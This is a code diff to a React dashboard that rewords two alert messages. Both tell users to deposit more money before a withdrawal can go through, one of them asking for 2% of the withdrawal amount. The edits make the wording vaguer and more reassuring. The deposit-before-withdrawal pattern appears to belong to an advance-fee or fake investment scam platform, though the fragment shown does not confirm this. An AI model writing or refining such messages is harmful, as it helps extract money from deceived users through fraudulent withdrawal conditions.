@@ -463,7 +463,7 @@ export default function Dashboard() {
                   alert(
                     `You need to deposit ${formatCurrency(
                       shortfall
-                    )} into your account so your balance reaches the minimum withdrawal amount of ${formatCurrency(
+                    )} into your account so your balance is considered eligible enough to be marked for the minimum withdrawal amount of ${formatCurrency(
                       minimumRequired
                     )}.`
                   );
@@ -480,7 +480,7 @@ export default function Dashboard() {
                   );
                 } else {
                   alert(
-                    `Withdrawal pending!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
+                    `Withdrawal submitted!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
                     )}\n\nInstruction: Please deposit ${formatCurrency(
                       withdrawAmount * 0.02
